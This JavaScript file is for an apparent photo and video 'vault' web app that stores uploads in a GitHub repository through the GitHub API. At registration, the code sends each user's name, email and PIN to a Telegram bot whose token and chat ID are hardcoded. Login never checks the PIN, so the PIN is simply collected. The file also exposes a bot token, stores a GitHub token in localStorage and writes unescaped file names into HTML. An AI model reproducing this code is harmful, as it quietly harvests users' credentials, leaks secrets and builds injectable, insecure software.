new Swiper(".mySwiper", { effect: "cards", grabCursor: true, autoplay: { delay: 2500 } });

let GITHUB_TOKEN = localStorage.getItem('vault_token') || ""; 
const REPO_OWNER = "SIYAMBOSS";
const REPO_NAME = "SIYAM-VAULT"; 
const BOT_TOKEN = "8536299808:AAHJFWEna66RMHZdq-AV20Ak1KOOSwTJT9k";
const CHAT_ID = "7416528268";

let isRegistering = false;
let deleteData = null;

window.onload = () => {
    if (!GITHUB_TOKEN) {
        document.getElementById('token-modal').classList.remove('hidden');
    } else {
        const user = localStorage.getItem('activeUser');
        if (user) showDashboard(user);
        else document.getElementById('auth-section').classList.remove('hidden');
    }
};

function saveToken() {
    const input = document.getElementById('token-input').value.trim();
    if (input.startsWith('ghp_')) {
        GITHUB_TOKEN = input;
        localStorage.setItem('vault_token', input);
        document.getElementById('token-modal').classList.add('hidden');
        location.reload();
    } else { alert("সঠিক GitHub Token দিন!"); }
}

function toggleAuth() {
    isRegistering = !isRegistering;
    document.getElementById('reg-fields').classList.toggle('hidden');
    document.getElementById('auth-title').innerText = isRegistering ? "CREATE" : "LOGIN";
}

async function handleAuth() {
    const email = document.getElementById('user-email').value;
    const pin = document.getElementById('pin-1').value;
    if(!email || !pin) return;
    if(isRegistering) {
        const name = document.getElementById('user-name').value;
        const msg = `🌟 NEW VAULT USER\n👤 Name: ${name}\n📧 Email: ${email}\n🔑 PIN: ${pin}`;
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
        alert("Registration Success!");
        toggleAuth();
    } else {
        localStorage.setItem('activeUser', email);
        showDashboard(email);
    }
}

function showDashboard(email) {
    document.getElementById('auth-section').classList.add('hidden');
    document.getElementById('dashboard').classList.remove('hidden');
    switchTab('photos');
}

function switchTab(tab) {
    const tabs = ['photos', 'videos'];
    tabs.forEach(t => {
        document.getElementById(`tab-${t}`).classList.remove('active');
        document.getElementById(`${t}-content`).classList.add('hidden');
    });
    document.getElementById(`tab-${tab}`).classList.add('active');
    document.getElementById(`${tab}-content`).classList.remove('hidden');
    loadContent(localStorage.getItem('activeUser'), tab);
}

// ৪. ডাইনামিক আপলোড ও প্রগ্রেস বার লজিক
async function uploadFiles(event) {
    const files = event.target.files;
    const email = localStorage.getItem('activeUser');
    if(!files.length || !email || !GITHUB_TOKEN) return;

    const progressContainer = document.getElementById('upload-progress-container');
    const progressBar = document.getElementById('upload-bar');
    const loader = document.getElementById('loader');

    progressContainer.classList.remove('hidden');
    loader.classList.remove('hidden');
    
    let total = files.length;
    let current = 0;

    for (let file of files) {
        await new Promise((resolve) => {
            const reader = new FileReader();
            reader.onload = async (e) => {
                try {
                    const content = e.target.result.split(',')[1];
                    const type = file.type.startsWith('video') ? 'videos' : 'photos';
                    const path = `vault/${email}/${type}/${Date.now()}_${file.name.replace(/\s+/g, '_')}`;

                    const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${path}`, {
                        method: 'PUT',
                        headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Content-Type': 'application/json' },
                        body: JSON.stringify({ message: "Upload", content: content })
                    });
                    if(res.ok) {
                        current++;
                        progressBar.style.width = (current / total * 100) + "%";
                    }
                    resolve();
                } catch (err) { resolve(); }
            };
            reader.readAsDataURL(file);
        });
    }

    setTimeout(() => {
        progressContainer.classList.add('hidden');
        loader.classList.add('hidden');
        progressBar.style.width = "0%";
        switchTab(files[0].type.startsWith('video') ? 'videos' : 'photos');
    }, 1000);
}

// ৫. কন্টেন্ট লোড ও প্রিভিউ
async function loadContent(email, type) {
    const container = document.getElementById(`${type}-content`);
    const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/vault/${email}/${type}`, {
        headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
    });
    
    if(res.ok) {
        const files = await res.json();
        container.innerHTML = files.reverse().map(f => {
            const isVideo = type === 'videos';
            return `
                <div class="relative group aspect-square overflow-hidden bg-zinc-900 border-[0.5px] border-zinc-800">
                    ${isVideo ? 
                        `<video src="${f.download_url}" onclick="openPreview('${f.download_url}', true)" class="cursor-pointer"></video>
                         <div class="absolute inset-0 flex items-center justify-center pointer-events-none"><i class="fa-solid fa-play text-white/40 text-2xl"></i></div>` : 
                        `<img src="${f.download_url}" onclick="openPreview('${f.download_url}', false)" class="w-full h-full object-cover cursor-pointer">`
                    }
                    <button onclick="openDeleteModal('${f.path}', '${f.sha}')" class="absolute top-1 right-1 bg-black/50 p-1.5 rounded-lg text-white opacity-0 group-hover:opacity-100 transition-all"><i class="fa-solid fa-trash text-[10px]"></i></button>
                </div>`;
        }).join('');
    } else { container.innerHTML = ""; }
}

function openPreview(url, isVideo) {
    const modal = document.getElementById('preview-modal');
    const box = document.getElementById('preview-content-box');
    const downloadBtn = document.getElementById('download-btn');
    
    downloadBtn.href = url;
    downloadBtn.setAttribute('download', 'SIYAM_VAULT_' + Date.now());

    box.innerHTML = isVideo ? 
        `<video src="${url}" controls autoplay class="max-w-full max-h-full"></video>` : 
        `<img src="${url}" class="max-w-full max-h-full shadow-2xl">`;
    
    modal.classList.remove('hidden');
    document.body.style.overflow = 'hidden';
}

function closePreview() {
    document.getElementById('preview-modal').classList.add('hidden');
    document.getElementById('preview-content-box').innerHTML = "";
    document.body.style.overflow = 'auto';
}

function openDeleteModal(path, sha) {
    deleteData = { path, sha };
    document.getElementById('delete-modal').classList.remove('hidden');
}
function closeDeleteModal() { document.getElementById('delete-modal').classList.add('hidden'); }

document.getElementById('confirm-delete-btn').onclick = async () => {
    closeDeleteModal();
    document.getElementById('loader').classList.remove('hidden');
    await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${deleteData.path}`, {
        method: 'DELETE',
        headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: "Delete", sha: deleteData.sha })
    });
    document.getElementById('loader').classList.add('hidden');
    switchTab(deleteData.path.includes('videos') ? 'videos' : 'photos');
};

function logout() {
    if(confirm("Logout and Clear Token?")) {
        localStorage.clear();
        location.reload();
    }
}
